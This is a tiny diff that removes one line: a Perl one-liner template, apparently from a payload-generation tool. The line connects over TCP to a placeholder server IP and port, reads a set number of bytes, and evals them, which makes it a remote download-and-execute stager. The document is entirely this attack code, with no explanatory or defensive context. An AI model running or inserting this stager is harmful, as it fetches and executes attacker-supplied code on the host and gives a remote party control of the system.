@@ -1,1 +1,0 @@
-perl -MSocket -e '$host = "{{SERVER_IP}}"; $port = {{SERVER_PORT}}; $len = {{PAYLOAD_SIZE}}; $iaddr = inet_aton($host); $paddr = sockaddr_in($port, $iaddr); $proto = getprotobyname("tcp"); socket($s, PF_INET, SOCK_STREAM, $proto); connect($s, $paddr); $buff = ""; $chnk = ""; for ($i=0; $i < $len; $i++) {$b = recv($s, $chnk, 1, 0); $buff .= $chnk;} close($s); eval($buff);'
